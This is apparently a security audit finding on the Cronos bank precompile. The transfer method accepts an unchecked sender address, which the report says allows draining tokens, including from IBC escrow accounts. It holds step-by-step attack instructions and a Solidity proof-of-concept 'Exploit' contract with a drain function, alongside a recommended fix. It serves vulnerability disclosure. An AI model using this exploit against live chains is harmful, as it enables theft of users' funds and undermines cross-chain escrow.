### Title
Unauthorized Token Transfer via `BankContract.transfer` — Missing Caller Authorization Check — (`x/cronos/keeper/precompiles/bank.go`)

### Summary

The `TransferMethodName` handler in `BankContract.Run` accepts an arbitrary `sender` address from ABI-decoded arguments and passes it directly to `bankKeeper.SendCoins` without verifying that `sender == contract.Caller()`. Any EVM contract at address `C` can therefore move `evm/C`-denominated tokens out of **any** account — including IBC transfer module escrow accounts — to an attacker-controlled address, with no authorization from the actual token holder.

---

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch: [1](#0-0) 

```go
sender := args[0].(common.Address)   // ← fully attacker-controlled
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(to); err != nil { ... }   // only checks recipient
denom := EVMDenom(contract.Caller())                    // denom tied to caller
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

The denom is correctly scoped to `contract.Caller()`, but the **source address** (`from`) is taken verbatim from the call arguments. There is no guard of the form `require(sender == contract.Caller())`. `checkBlockedAddr` is applied only to `to`, not to `from`. [2](#0-1) 

`BlockedAddrs` in the app only covers registered module accounts: [3](#0-2) 

IBC escrow accounts are **not** module accounts — they are regular accounts derived via `ibctransfertypes.GetEscrowAddress(portID, channelID)` — so they are absent from the blocked list and `SendCoins` will succeed against them.

---

### Impact Explanation

**Immediate impact — theft from any `evm/<C>` holder:**  
Contract `C` can call `bank.transfer(victim, attacker, amount)` to drain `evm/C` tokens from any address that holds them. No consent from `victim` is required.

**Critical IBC escrow drain:**  
1. Attacker deploys contract `C`.  
2. Attacker mints `evm/C` tokens via `bank.mint(attacker, N)`.  
3. Attacker sends those tokens via a standard `MsgTransfer` to a counterparty chain; the IBC transfer module escrows them at `GetEscrowAddress("transfer", channelID)`.  
4. Attacker calls `bank.transfer(escrowAddr, attacker, N)` from contract `C`.  
5. `SendCoins` moves `N` `evm/C` tokens out of the escrow account with no IBC protocol involvement.  

The escrow account is now short `N` tokens while the counterparty chain still holds the corresponding vouchers — a direct violation of the IBC escrow invariant and an unbacked-voucher creation on the remote chain.

---

### Likelihood Explanation

The attack is fully self-contained and requires no privileged access:
- Deploying a contract is permissionless on Cronos.
- `bank.mint` is callable by any contract for its own denom.
- `MsgTransfer` is a standard user transaction.
- The final `bank.transfer` call requires only gas.

---

### Recommendation

Add a caller-authorization guard at the top of the `TransferMethodName` branch:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    // Enforce that only the contract itself may debit its own evm/<C> tokens
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
``` [4](#0-3) 

If the intended design is to allow a contract to move tokens on behalf of approved third parties, an explicit on-chain allowance mechanism (analogous to ERC-20 `approve`/`transferFrom`) must be implemented and checked here.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract Exploit {
    IBank constant BANK = IBank(address(0x64)); // precompile at 0x0000...0064

    // Step 1: mint evm/<this> tokens to self
    function setup(uint256 amount) external {
        BANK.mint(address(this), amount);
    }

    // Step 2: after IBC escrow is funded, drain it
    function drain(address escrowAccount, address attacker, uint256 amount) external {
        // sender = escrowAccount (arbitrary, not validated)
        // denom  = evm/<address(this)>  (tied to this contract)
        BANK.transfer(escrowAccount, attacker, amount);
    }
}
```

**Test plan:**
1. Deploy `Exploit` at address `C`.
2. Call `setup(1000)` — escrow account now holds `evm/C` after IBC send.
3. Record escrow balance of `evm/C` before attack.
4. Call `drain(escrowAddr, attackerEOA, 1000)`.
5. Assert escrow balance decreased by 1000 and attacker balance increased by 1000 — without any IBC packet acknowledgement or timeout.
